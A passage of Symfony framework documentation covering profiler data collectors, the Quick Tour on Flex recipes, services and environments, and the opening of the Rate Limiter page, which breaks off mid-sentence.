Updating the Web Debug Toolbar After AJAX Requests
--------------------------------------------------

`Single-page applications`_ (SPA) are web applications that interact with the
user by dynamically rewriting the current page rather than loading entire new
pages from a server.

By default, the debug toolbar displays the information of the initial page load
and doesn't refresh after each AJAX request. However, you can set the
``Symfony-Debug-Toolbar-Replace`` header to a value of ``'1'`` in the response to
the AJAX request to force the refresh of the toolbar::

    $response->headers->set('Symfony-Debug-Toolbar-Replace', '1');

Ideally this header should only be set during development and not for
production. To do that, create an :doc:`event subscriber </event_dispatcher>`
and listen to the :ref:`kernel.response <component-http-kernel-kernel-response>`
event::

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\HttpKernel\Event\ResponseEvent;
    use Symfony\Component\HttpKernel\KernelInterface;

    // ...

    class MySubscriber implements EventSubscriberInterface
    {
        public function __construct(
            private KernelInterface $kernel,
        ) {
        }

        // ...

        public function onKernelResponse(ResponseEvent $event): void
        {
            if (!$this->kernel->isDebug()) {
                return;
            }

            $request = $event->getRequest();
            if (!$request->isXmlHttpRequest()) {
                return;
            }

            $response = $event->getResponse();
            $response->headers->set('Symfony-Debug-Toolbar-Replace', '1');
        }
    }

.. _profiler-data-collector:

Creating a Data Collector
-------------------------

The Symfony Profiler obtains its profiling and debug information using some
special classes called data collectors. Symfony comes bundled with a few of
them, but you can also create your own.

A data collector is a PHP class that implements the
:class:`Symfony\\Component\\HttpKernel\\DataCollector\\DataCollectorInterface`.
For convenience, your data collectors can also extend from the
:class:`Symfony\\Bundle\\FrameworkBundle\\DataCollector\\AbstractDataCollector`
class, which implements the interface and provides some utilities and the
``$this->data`` property to store the collected information.

The following example shows a custom collector that stores information about the
request::

    // src/DataCollector/RequestCollector.php
    namespace App\DataCollector;

    use Symfony\Bundle\FrameworkBundle\DataCollector\AbstractDataCollector;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    class RequestCollector extends AbstractDataCollector
    {
        public function collect(Request $request, Response $response, ?\Throwable $exception = null): void
        {
            $this->data = [
                'method' => $request->getMethod(),
                'acceptable_content_types' => $request->getAcceptableContentTypes(),
            ];
        }
    }

These are the method that you can define in the data collector class:

:method:`Symfony\\Component\\HttpKernel\\DataCollector\\DataCollectorInterface::collect` method:
    Stores the collected data in local properties (``$this->data`` if you extend
    from ``AbstractDataCollector``). If you need some services to collect the
    data, inject those services in the data collector constructor.

    .. caution::

        The ``collect()`` method is only called once. It is not used to "gather"
        data but is there to "pick up" the data that has been stored by your
        service.

    .. caution::

        As the profiler serializes data collector instances, you should not
        store objects that cannot be serialized (like PDO objects) or you need
        to provide your own ``serialize()`` method.

:method:`Symfony\\Component\\HttpKernel\\DataCollector\\DataCollectorInterface::reset` method:
    It's called between requests to reset the state of the profiler. By default
    it only empties the ``$this->data`` contents, but you can override this method
    to do additional cleaning.

:method:`Symfony\\Component\\HttpKernel\\DataCollector\\DataCollectorInterface::getName` method:
    Returns the collector identifier, which must be unique in the application.
    By default it returns the FQCN of the data collector class, but you can
    override this method to return a custom name (e.g. ``app.request_collector``).
    This value is used later to access the collector information (see
    :doc:`/testing/profiling`) so you may prefer using short strings instead of FQCN strings.

The ``collect()`` method is called during the :ref:`kernel.response <component-http-kernel-kernel-response>`
event. If you need to collect data that is only available later, implement
:class:`Symfony\\Component\\HttpKernel\\DataCollector\\LateDataCollectorInterface`
and define the ``lateCollect()`` method, which is invoked right before the profiler
data serialization (during :ref:`kernel.terminate <component-http-kernel-kernel-terminate>` event).

.. note::

    If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`
    with ``autoconfigure``, then Symfony will start using your data collector after the
    next page refresh. Otherwise, :ref:`enable the data collector by hand <data_collector_tag>`.

Adding Web Profiler Templates
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The information collected by your data collector can be displayed both in the
web debug toolbar and in the web profiler. To do so, you need to create a Twig
template that includes some specific blocks.

First, add the ``getTemplate()`` method in your data collector class to return
the path of the Twig template to use. Then, add some *getters* to give the
template access to the collected information::

    // src/DataCollector/RequestCollector.php
    namespace App\DataCollector;

    use Symfony\Bundle\FrameworkBundle\DataCollector\AbstractDataCollector;
    use Symfony\Component\VarDumper\Cloner\Data;

    class RequestCollector extends AbstractDataCollector
    {
        // ...

        public static function getTemplate(): ?string
        {
            return 'data_collector/template.html.twig';
        }

        public function getMethod(): string
        {
            return $this->data['method'];
        }

        public function getAcceptableContentTypes(): array
        {
            return $this->data['acceptable_content_types'];
        }

        public function getSomeObject(): Data
        {
            // use the cloneVar() method to dump collected data in the profiler
            return $this->cloneVar($this->data['method']);
        }
    }

In the simplest case, you want to display the information in the toolbar
without providing a profiler panel. This requires to define the ``toolbar``
block and set the value of two variables called ``icon`` and ``text``:

.. code-block:: html+twig

    {# templates/data_collector/template.html.twig #}
    {% extends '@WebProfiler/Profiler/layout.html.twig' %}

    {% block toolbar %}
        {% set icon %}
            {# this is the content displayed as a panel in the toolbar #}
            <svg xmlns="http://www.w3.org/2000/svg"> ... </svg>
            <span class="sf-toolbar-value">Request</span>
        {% endset %}

        {% set text %}
            {# this is the content displayed when hovering the mouse over
               the toolbar panel #}
            <div class="sf-toolbar-info-piece">
                <b>Method</b>
                <span>{{ collector.method }}</span>
            </div>

            <div class="sf-toolbar-info-piece">
                <b>Accepted content type</b>
                <span>{{ collector.acceptableContentTypes|join(', ') }}</span>
            </div>
        {% endset %}

        {# the 'link' value set to 'false' means that this panel doesn't
           show a section in the web profiler #}
        {{ include('@WebProfiler/Profiler/toolbar_item.html.twig', { link: false }) }}
    {% endblock %}

.. tip::

    Symfony Profiler icons are selected from `Tabler icons`_, a large and open
    source collection of SVG icons. It's recommended to also use those icons for
    your own profiler panels to get a consistent look.

.. tip::

    Built-in collector templates define all their images as embedded SVG files.
    This makes them work everywhere without having to mess with web assets links:

    .. code-block:: twig

        {% set icon %}
            {{ include('data_collector/icon.svg') }}
            {# ... #}
        {% endset %}

If the toolbar panel includes extended web profiler information, the Twig template
must also define additional blocks:

.. code-block:: html+twig

    {# templates/data_collector/template.html.twig #}
    {% extends '@WebProfiler/Profiler/layout.html.twig' %}

    {% block toolbar %}
        {% set icon %}
            {# ... #}
        {% endset %}

        {% set text %}
            <div class="sf-toolbar-info-piece">
                {# ... #}
            </div>
        {% endset %}

        {{ include('@WebProfiler/Profiler/toolbar_item.html.twig', { 'link': true }) }}
    {% endblock %}

    {% block head %}
        {# Optional. Here you can link to or define your own CSS and JS contents. #}
        {# Use {{ parent() }} to extend the default styles instead of overriding them. #}
    {% endblock %}

    {% block menu %}
        {# This left-hand menu appears when using the full-screen profiler. #}
        <span class="label">
            <span class="icon"><img src="..." alt=""/></span>
            <strong>Request</strong>
        </span>
    {% endblock %}

    {% block panel %}
        {# Optional, for showing the most details. #}
        <h2>Acceptable Content Types</h2>
        <table>
            <tr>
                <th>Content Type</th>
            </tr>

            {% for type in collector.acceptableContentTypes %}
            <tr>
                <td>{{ type }}</td>
            </tr>
            {% endfor %}

            {# use the profiler_dump() function to render the contents of dumped objects #}
            <tr>
                {{ profiler_dump(collector.someObject) }}
            </tr>
        </table>
    {% endblock %}

The ``menu`` and ``panel`` blocks are the only required blocks to define the
contents displayed in the web profiler panel associated with this data collector.
All blocks have access to the ``collector`` object.

.. note::

    The position of each panel in the toolbar is determined by the collector
    priority, which can only be defined when :ref:`configuring the data collector by hand <data_collector_tag>`.

.. note::

    If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`
    with ``autoconfigure``, then Symfony will start displaying your collector data
    in the toolbar after the next page refresh. Otherwise, :ref:`enable the data collector by hand <data_collector_tag>`.

.. _data_collector_tag:

Enabling Custom Data Collectors
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you don't use Symfony's default configuration with
:ref:`autowire and autoconfigure <service-container-services-load-example>`
you'll need to configure the data collector explicitly:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\DataCollector\RequestCollector:
                tags:
                    -
                        name: data_collector
                        # must match the value returned by the getName() method
                        id: 'App\DataCollector\RequestCollector'
                        # optional template (it has more priority than the value returned by getTemplate())
                        template: 'data_collector/template.html.twig'
                        # optional priority (positive or negative integer; default = 0)
                        # priority: 300

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\DataCollector\RequestCollector">
                    <!-- the 'template' attribute has more priority than the value returned by getTemplate() -->
                    <tag name="data_collector"
                        id="App\DataCollector\RequestCollector"
                        template="data_collector/template.html.twig"
                    />
                    <!-- optional 'priority' attribute (positive or negative integer; default = 0) -->
                    <!-- priority="300" -->
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\DataCollector\RequestCollector;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(RequestCollector::class)
                ->tag('data_collector', [
                    'id' => RequestCollector::class,
                    // optional template (it has more priority than the value returned by getTemplate())
                    'template' => 'data_collector/template.html.twig',
                    // optional priority (positive or negative integer; default = 0)
                    // 'priority' => 300,
                ]);
        };

.. _`Single-page applications`: https://en.wikipedia.org/wiki/Single-page_application
.. _`Blackfire`: https://blackfire.io/docs/introduction?utm_source=symfony&utm_medium=symfonycom_docs&utm_campaign=profiler
.. _`Tabler icons`: https://github.com/tabler/tabler-icons
Flex: Compose your Application
==============================

After reading the first part of this tutorial, you have decided that Symfony was
worth another 10 minutes. Great choice! In this second part, you'll learn about
Symfony Flex: the amazing tool that makes adding new features as simple as running
one command. It's also the reason why Symfony is ideal for a small micro-service
or a huge application. Curious? Perfect!

Symfony: Start Micro!
---------------------

Unless you're building a pure API (more on that soon!), you'll probably want to
render HTML. To do that, you'll use `Twig`_. Twig is a flexible, fast, and secure
template engine for PHP. It makes your templates more readable and concise; it also
makes them more friendly for web designers.

Is Twig already installed in our application? Actually, not yet! And that's great!
When you start a new Symfony project, it's *small*:  only the most critical dependencies
are included in your ``composer.json`` file:

.. code-block:: text

    "require": {
        "...",
        "symfony/console": "^6.1",
        "symfony/flex": "^2.0",
        "symfony/framework-bundle": "^6.1",
        "symfony/yaml": "^6.1"
    }

This makes Symfony different from any other PHP framework! Instead of starting with
a *bulky* app with *every* possible feature you might ever need, a Symfony app is
small, simple and *fast*. And you're in total control of what you add.

Flex Recipes and Aliases
------------------------

So how can we install and configure Twig? By running one single command:

.. code-block:: terminal

    $ composer require twig

Two *very* interesting things happen behind the scenes thanks to Symfony Flex: a
Composer plugin that is already installed in our project.

First, ``twig`` is not the name of a Composer package: it's a Flex *alias* that
points to ``symfony/twig-bundle``. Flex resolves that alias for Composer.

And second, Flex installs a *recipe* for ``symfony/twig-bundle``. What's a recipe?
It's a way for a library to automatically configure itself by adding and modifying
files. Thanks to recipes, adding features is seamless and automated: install a package
and you're done!

You can find a full list of recipes and aliases inside `RECIPES.md on the recipes repository`_.

What did this recipe do? In addition to automatically enabling the feature in
``config/bundles.php``, it added 3 things:

``config/packages/twig.yaml``
    A configuration file that sets up Twig with sensible defaults.

``config/packages/test/twig.yaml``
    A configuration file that changes some Twig options when running tests.

``templates/``
    This is the directory where template files will live. The recipe also added
    a ``base.html.twig`` layout file.

Twig: Rendering a Template
--------------------------

Thanks to Flex, after one command, you can start using Twig immediately:

.. code-block:: diff

      <?php
      // src/Controller/DefaultController.php
      namespace App\Controller;

      use Symfony\Component\Routing\Attribute\Route;
      use Symfony\Component\HttpFoundation\Response;
    + use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

    - class DefaultController
    + class DefaultController extends AbstractController
      {
           #[Route('/hello/{name}', methods: ['GET'])]
           public function index(string $name): Response
           {
    -        return new Response("Hello $name!");
    +        return $this->render('default/index.html.twig', [
    +            'name' => $name,
    +        ]);
           }
      }

By extending ``AbstractController``, you now have access to a number of shortcut
methods and tools, like ``render()``. Create the new template:

.. code-block:: html+twig

    {# templates/default/index.html.twig #}
    <h1>Hello {{ name }}</h1>

That's it! The ``{{ name }}`` syntax will print the ``name`` variable that's passed
in from the controller. If you're new to Twig, welcome! You'll learn more about
its syntax and power later.

But, right now, the page *only* contains the ``h1`` tag. To give it an HTML layout,
extend ``base.html.twig``:

.. code-block:: html+twig

    {# templates/default/index.html.twig #}
    {% extends 'base.html.twig' %}

    {% block body %}
        <h1>Hello {{ name }}</h1>
    {% endblock %}

This is called template inheritance: our page now inherits the HTML structure from
``base.html.twig``.

Profiler: Debugging Paradise
----------------------------

One of the *coolest* features of Symfony isn't even installed yet! Let's fix that:

.. code-block:: terminal

    $ composer require profiler

Yes! This is another alias! And Flex *also* installs another recipe, which automates
the configuration of Symfony's Profiler. What's the result? Refresh!

See that black bar on the bottom? That's the web debug toolbar, and it's your new
best friend. By hovering over each icon, you can get information about what controller
was executed, performance information, cache hits & misses and a lot more. Click
any icon to go into the *profiler* where you have even *more* detailed debugging
and performance data!

Oh, and as you install more libraries, you'll get more tools (like a web debug toolbar
icon that shows database queries).

You can now directly use the profiler because it configured *itself* thanks to
the recipe. What else can we install?

Rich API Support
----------------

Are you building an API? You can already return JSON from any controller::

    // src/Controller/DefaultController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\JsonResponse;
    use Symfony\Component\Routing\Attribute\Route;

    class DefaultController extends AbstractController
    {
        // ...

        #[Route('/api/hello/{name}', methods: ['GET'])]
        public function apiHello(string $name): JsonResponse
        {
            return $this->json([
                'name' => $name,
                'symfony' => 'rocks',
            ]);
        }
    }

But for a *truly* rich API, try installing `API Platform`_:

.. code-block:: terminal

    $ composer require api

This is an alias to ``api-platform/api-pack`` :ref:`Symfony pack <symfony-packs>`,
which has dependencies on several other packages, like Symfony's Validator and
Security components, as well as the Doctrine ORM. In fact, Flex installed *5* recipes!

But like usual, we can immediately start using the new library. Want to create a
rich API for a ``product`` table? Create a ``Product`` entity and give it the
``#[ApiResource]`` attribute::

    // src/Entity/Product.php
    namespace App\Entity;

    use ApiPlatform\Core\Annotation\ApiResource;
    use Doctrine\ORM\Mapping as ORM;

    #[ORM\Entity]
    #[ApiResource]
    class Product
    {
        #[ORM\Id]
        #[ORM\GeneratedValue(strategy: 'AUTO')]
        #[ORM\Column(type: 'integer')]
        private int $id;

        #[ORM\Column(type: 'string')]
        private string $name;

        #[ORM\Column(type: 'integer')]
        private int $price;

        // ...
    }

Done! You now have endpoints to list, add, update and delete products! Don't believe
me? List your routes by running:

.. code-block:: terminal

    $ php bin/console debug:router

    ------------------------------ -------- -------------------------------------
     Name                           Method   Path
    ------------------------------ -------- -------------------------------------
     api_products_get_collection    GET      /api/products.{_format}
     api_products_post_collection   POST     /api/products.{_format}
     api_products_get_item          GET      /api/products/{id}.{_format}
     api_products_put_item          PUT      /api/products/{id}.{_format}
     api_products_delete_item       DELETE   /api/products/{id}.{_format}
     ...
    ------------------------------ -------- -------------------------------------

.. _ easily-remove-recipes:

Removing Recipes
----------------

Not convinced yet? No problem: remove the library:

.. code-block:: terminal

    $ composer remove api

Flex will *uninstall* the recipes: removing files and undoing changes to put your
app back in its original state. Experiment without worry.

More Features, Architecture and Speed
-------------------------------------

I hope you're as excited about Flex as I am! But we still have *one* more chapter,
and it's the most important yet. I want to show you how Symfony empowers you to quickly
build features *without* sacrificing code quality or performance. It's all about
the service container, and it's Symfony's super power. Read on: about :doc:`/quick_tour/the_architecture`.

.. _`RECIPES.md on the recipes repository`: https://github.com/symfony/recipes/blob/flex/main/RECIPES.md
.. _`API Platform`: https://api-platform.com/
.. _`Twig`: https://twig.symfony.com/
The Quick Tour
==============

.. toctree::
   :maxdepth: 1

   the_big_picture
   flex_recipes
   the_architecture
The Architecture
================

You are my hero! Who would have thought that you would still be here after the first
two parts? Your efforts will be well-rewarded soon. The first two parts didn't look
too deeply at the architecture of the framework. Because it makes Symfony stand apart
from the framework crowd, let's dive into the architecture now.

Add Logging
-----------

A new Symfony app is micro: it's basically just a routing & controller system. But
thanks to Flex, installing more features is simple.

Want a logging system? No problem:

.. code-block:: terminal

    $ composer require logger

This installs and configures (via a recipe) the powerful `Monolog`_ library. To
use the logger in a controller, add a new argument type-hinted with ``LoggerInterface``::

    // src/Controller/DefaultController.php
    namespace App\Controller;

    use Psr\Log\LoggerInterface;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class DefaultController extends AbstractController
    {
        #[Route('/hello/{name}', methods: ['GET'])]
        public function index(string $name, LoggerInterface $logger): Response
        {
            $logger->info("Saying hello to $name!");

            // ...
        }
    }

That's it! The new log message will be written to ``var/log/dev.log``. The log
file path or even a different method of logging can be configured by updating
one of the config files added by the recipe.

Services & Autowiring
---------------------

But wait! Something *very* cool just happened. Symfony read the ``LoggerInterface``
type-hint and automatically figured out that it should pass us the Logger object!
This is called *autowiring*.

Every bit of work that's done in a Symfony app is done by an *object*: the Logger
object logs things and the Twig object renders templates. These objects are called
*services* and they are *tools* that help you build rich features.

To make life awesome, you can ask Symfony to pass you a service by using a type-hint.
What other possible classes or interfaces could you use? Find out by running:

.. code-block:: terminal

    $ php bin/console debug:autowiring

      # this is just a *small* sample of the output...

      Describes a logger instance.
      Psr\Log\LoggerInterface - alias:monolog.logger

      Request stack that controls the lifecycle of requests.
      Symfony\Component\HttpFoundation\RequestStack - alias:request_stack

      RouterInterface is the interface that all Router classes must implement.
      Symfony\Component\Routing\RouterInterface - alias:router.default

      [...]

This is just a short summary of the full list! And as you add more packages, this
list of tools will grow!

Creating Services
-----------------

To keep your code organized, you can even create your own services! Suppose you
want to generate a random greeting (e.g. "Hello", "Yo", etc). Instead of putting
this code directly in your controller, create a new class::

    // src/GreetingGenerator.php
    namespace App;

    class GreetingGenerator
    {
        public function getRandomGreeting(): string
        {
            $greetings = ['Hey', 'Yo', 'Aloha'];
            $greeting = $greetings[array_rand($greetings)];

            return $greeting;
        }
    }

Great! You can use it immediately in your controller::

    // src/Controller/DefaultController.php
    namespace App\Controller;

    use App\GreetingGenerator;
    use Psr\Log\LoggerInterface;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class DefaultController extends AbstractController
    {
        #[Route('/hello/{name}', methods: ['GET'])]
        public function index(string $name, LoggerInterface $logger, GreetingGenerator $generator): Response
        {
            $greeting = $generator->getRandomGreeting();

            $logger->info("Saying $greeting to $name!");

            // ...
        }
    }

That's it! Symfony will instantiate the ``GreetingGenerator`` automatically and
pass it as an argument. But, could we *also* move the logger logic to ``GreetingGenerator``?
Yes! You can use autowiring inside a service to access *other* services. The only
difference is that it's done in the constructor:

.. code-block:: diff

      <?php
      // src/GreetingGenerator.php
    + use Psr\Log\LoggerInterface;

      class GreetingGenerator
      {
    +     public function __construct(
    +         private LoggerInterface $logger,
    +     ) {
    +     }

          public function getRandomGreeting(): string
          {
              // ...

    +        $this->logger->info('Using the greeting: '.$greeting);

               return $greeting;
          }
      }

Yes! This works too: no configuration, no time wasted. Keep coding!

Twig Extension & Autoconfiguration
----------------------------------

Thanks to Symfony's service handling, you can *extend* Symfony in many ways, like
by creating an event subscriber or a security voter for complex authorization
rules. Let's add a new filter to Twig called ``greet``. How? Create a class
that extends ``AbstractExtension``::

    // src/Twig/GreetExtension.php
    namespace App\Twig;

    use App\GreetingGenerator;
    use Twig\Extension\AbstractExtension;
    use Twig\TwigFilter;

    class GreetExtension extends AbstractExtension
    {
        public function __construct(
            private GreetingGenerator $greetingGenerator,
        ) {
        }

        public function getFilters(): array
        {
            return [
                new TwigFilter('greet', [$this, 'greetUser']),
            ];
        }

        public function greetUser(string $name): string
        {
            $greeting =  $this->greetingGenerator->getRandomGreeting();

            return "$greeting $name!";
        }
    }

After creating just *one* file, you can use this immediately:

.. code-block:: html+twig

    {# templates/default/index.html.twig #}
    {# Will print something like "Hey Symfony!" #}
    <h1>{{ name|greet }}</h1>

How does this work? Symfony notices that your class extends ``AbstractExtension``
and so *automatically* registers it as a Twig extension. This is called autoconfiguration,
and it works for *many* many things. Create a class and then extend a base class
(or implement an interface). Symfony takes care of the rest.

Blazing Speed: The Cached Container
-----------------------------------

After seeing how much Symfony handles automatically, you might be wondering: "Doesn't
this hurt performance?" Actually, no! Symfony is blazing fast.

How is that possible? The service system is managed by a very important object called
the "container". Most frameworks have a container, but Symfony's is unique because
it's *cached*. When you loaded your first page, all of the service information was
compiled and saved. This means that the autowiring and autoconfiguration features
add *no* overhead! It also means that you get *great* errors: Symfony inspects and
validates *everything* when the container is built.

Now you might be wondering what happens when you update a file and the cache needs
to rebuild? I like your thinking! It's smart enough to rebuild on the next page
load. But that's really the topic of the next section.

Development Versus Production: Environments
-------------------------------------------

One of a framework's main jobs is to make debugging easy! And our app is *full* of
great tools for this: the web debug toolbar displays at the bottom of the page, errors
are big, beautiful & explicit, and any configuration cache is automatically rebuilt
whenever needed.

But what about when you deploy to production? We will need to hide those tools and
optimize for speed!

This is solved by Symfony's *environment* system. Symfony applications begin with
three environments: ``dev``, ``prod``, and ``test``. You can define options for
specific environments in the configuration files from the ``config/`` directory
using the special ``when@`` keyword:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/routing.yaml
        framework:
            router:
                utf8: true

        when@prod:
            framework:
                router:
                    strict_requirements: null

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:router utf8="true"/>
            </framework:config>

            <when env="prod">
                <framework:config>
                    <framework:router strict-requirements="null"/>
                </framework:config>
            </when>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework, ContainerConfigurator $container): void {
            $framework->router()
                ->utf8(true)
            ;

            if ('prod' === $container->env()) {
                $framework->router()
                    ->strictRequirements(null)
                ;
            }
        };

This is a *powerful* idea: by changing one piece of configuration (the environment),
your app is transformed from a debugging-friendly experience to one that's optimized
for speed.

Oh, how do you change the environment? Change the ``APP_ENV`` environment variable
from ``dev`` to ``prod``:

.. code-block:: diff

      # .env
    - APP_ENV=dev
    + APP_ENV=prod

But I want to talk more about environment variables next. Change the value back
to ``dev``: debugging tools are great when you're working locally.

Environment Variables
---------------------

Every app contains configuration that's different on each server - like database
connection information or passwords. How should these be stored? In files? Or another way?

Symfony follows the industry best practice by storing server-based configuration
as *environment* variables. This means that Symfony works *perfectly* with
Platform as a Service (PaaS) deployment systems as well as Docker.

But setting environment variables while developing can be a pain. That's why your
app automatically loads a ``.env`` file. The keys in this file then become environment
variables and are read by your app:

.. code-block:: bash

    # .env
    ###> symfony/framework-bundle ###
    APP_ENV=dev
    APP_SECRET=cc86c7ca937636d5ddf1b754beb22a10
    ###< symfony/framework-bundle ###

At first, the file doesn't contain much. But as your app grows, you'll add more
configuration as you need it. But, actually, it gets much more interesting! Suppose
your app needs a database ORM. Let's install the Doctrine ORM:

.. code-block:: terminal

    $ composer require doctrine

Thanks to a new recipe installed by Flex, look at the ``.env`` file again:

.. code-block:: diff

      ###> symfony/framework-bundle ###
      APP_ENV=dev
      APP_SECRET=cc86c7ca937636d5ddf1b754beb22a10
      ###< symfony/framework-bundle ###

    + ###> doctrine/doctrine-bundle ###
    + # ...
    + DATABASE_URL=mysql://db_user:db_password@127.0.0.1:3306/db_name
    + ###< doctrine/doctrine-bundle ###

The new ``DATABASE_URL`` environment variable was added *automatically* and is already
referenced by the new ``doctrine.yaml`` configuration file. By combining environment
variables and Flex, you're using industry best practices without any extra effort.

Keep Going!
-----------

Call me crazy, but after reading this part, you should be comfortable with the most
*important* parts of Symfony. Everything in Symfony is designed to get out of your
way so you can keep coding and adding features, all with the speed and quality you
demand.

That's all for the quick tour. From authentication, to forms, to caching, there is
so much more to discover. Ready to dig into these topics now? Look no further - go
to the official :doc:`/index` and pick any guide you want.

.. _`Monolog`: https://github.com/Seldaek/monolog
The Big Picture
===============

Start using Symfony in 10 minutes! Really! That's all you need to understand the
most important concepts and start building a real project!

If you've used a web framework before, you should feel right at home with
Symfony. If not, welcome to a whole new way of developing web applications. Symfony
*embraces* best practices, keeps backwards compatibility (Yes! Upgrading is always
safe & easy!) and offers long-term support.

.. _installing-symfony2:

Downloading Symfony
-------------------

First, make sure you've installed `Composer`_ and have PHP 8.1 or higher.

Ready? In a terminal, run:

.. code-block:: terminal

    $ composer create-project symfony/skeleton quick_tour

This creates a new ``quick_tour/`` directory with a small, but powerful new
Symfony application:

.. code-block:: text

    quick_tour/
    ├─ .env
    ├─ bin/console
    ├─ composer.json
    ├─ composer.lock
    ├─ config/
    ├─ public/index.php
    ├─ src/
    ├─ symfony.lock
    ├─ var/
    └─ vendor/

Can we already load the project in a browser? Yes! You can setup
:doc:`Nginx or Apache </setup/web_server_configuration>` and configure their
document root to be the ``public/`` directory. But, for development, it's better
to :doc:`install the Symfony local web server </setup/symfony_server>` and run
it as follows:

.. code-block:: terminal

    $ symfony server:start

Try your new app by going to ``http://localhost:8000`` in a browser!

.. image:: /_images/quick_tour/no_routes_page.png
    :alt: The default Symfony welcome page.
    :class: with-browser

Fundamentals: Route, Controller, Response
-----------------------------------------

Our project only has about 15 files, but it's ready to become a sleek API, a robust
web app, or a microservice. Symfony starts small, but scales with you.

But before we go too far, let's dig into the fundamentals by building our first page.

Start in ``config/routes.yaml``: this is where *we* can define the URL to our new
page. Uncomment the example that already lives in the file:

.. code-block:: yaml

    # config/routes.yaml
    index:
        path: /
        controller: 'App\Controller\DefaultController::index'

This is called a *route*: it defines the URL to your page (``/``) and the "controller":
the *function* that will be called whenever anyone goes to this URL. That function
doesn't exist yet, so let's create it!

In ``src/Controller``, create a new ``DefaultController`` class and an ``index``
method inside::

    // src/Controller/DefaultController.php
    namespace App\Controller;

    use Symfony\Component\HttpFoundation\Response;

    class DefaultController
    {
        public function index(): Response
        {
            return new Response('Hello!');
        }
    }

That's it! Try going to the homepage: ``http://localhost:8000/``. Symfony sees
that the URL matches our route and then executes the new ``index()`` method.

A controller is just a normal function with *one* rule: it must return a Symfony
``Response`` object. But that response can contain anything: simple text, JSON or
a full HTML page.

But the routing system is *much* more powerful. So let's make the route more interesting:

.. code-block:: diff

      # config/routes.yaml
      index:
    -     path: /
    +     path: /hello/{name}
          controller: 'App\Controller\DefaultController::index'

The URL to this page has changed: it is *now* ``/hello/*``: the ``{name}`` acts
like a wildcard that matches anything. And it gets better! Update the controller too:

.. code-block:: diff

      <?php
      // src/Controller/DefaultController.php
      namespace App\Controller;

      use Symfony\Component\HttpFoundation\Response;

      class DefaultController
      {
    -     public function index()
    +     public function index(string $name): Response
          {
    -         return new Response('Hello!');
    +         return new Response("Hello $name!");
          }
      }

Try the page out by going to ``http://localhost:8000/hello/Symfony``. You should
see: Hello Symfony! The value of the ``{name}`` in the URL is available as a ``$name``
argument in your controller.

But this can be even simpler! Comment-out the YAML route by adding the
``#`` character:

.. code-block:: yaml

    # config/routes.yaml
    # index:
    #     path: /hello/{name}
    #     controller: 'App\Controller\DefaultController::index'

Instead, add the route *right above* the controller method:

.. code-block:: diff

      <?php
      // src/Controller/DefaultController.php
      namespace App\Controller;

      use Symfony\Component\HttpFoundation\Response;
    + use Symfony\Component\Routing\Attribute\Route;

      class DefaultController
      {
    +      #[Route('/hello/{name}', methods: ['GET'])]
           public function index(string $name): Response
           {
               // ...
           }
      }

This works just like before! But by using attributes, the route and controller
live right next to each other. Need another page? Add another route and method
in ``DefaultController``::

    // src/Controller/DefaultController.php
    namespace App\Controller;

    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class DefaultController
    {
        // ...

        #[Route('/simplicity', methods: ['GET'])]
        public function simple(): Response
        {
            return new Response('Simple! Easy! Great!');
        }
    }

Routing can do *even* more, but we'll save that for another time! Right now, our
app needs more features! Like a template engine, logging, debugging tools and more.

Keep reading with :doc:`/quick_tour/flex_recipes`.

.. _`Composer`: https://getcomposer.org/
Rate Limiter
============

A "rate limiter" controls how frequently some event (e.g. an HTTP request or a
login attempt) is allowed to happen. Rate limiting is commonly used as a
defensive measure to protect services from excessive use (intended or not) and
maintain their availability. It's also useful to control your internal or
outbound processes (e.g. limit the number of simultaneously processed messages).

Symfony uses these rate limiters in built-in features like :ref:`login throttling <security-login-throttling>`,
which limits how many failed login attempts a user can make in a given period of
time, but you can use them for your own features too.

.. danger::

    By definition, the Symfony rate limiters require Symfony to be booted
    in a PHP process. This makes them not useful to protect against `DoS attacks`_.
    Such protections must consume the least resources possible. Consider
    using `Apache mod_ratelimit`_, `NGINX rate limiting`_ or proxies (like
    AWS or Cloudflare) to prevent your server from being overwhelmed.

.. _rate-limiter-policies:

Rate Limiting Policies
----------------------

Symfony's rate limiter implements some of the most common policies to enforce
rate limits: **fixed window**, **sliding window**, **token bucket**.

Fixed Window Rate Limiter
~~~~~~~~~~~~~~~~~~~~~~~~~

This is the simplest technique and it's based on setting a limit for a given
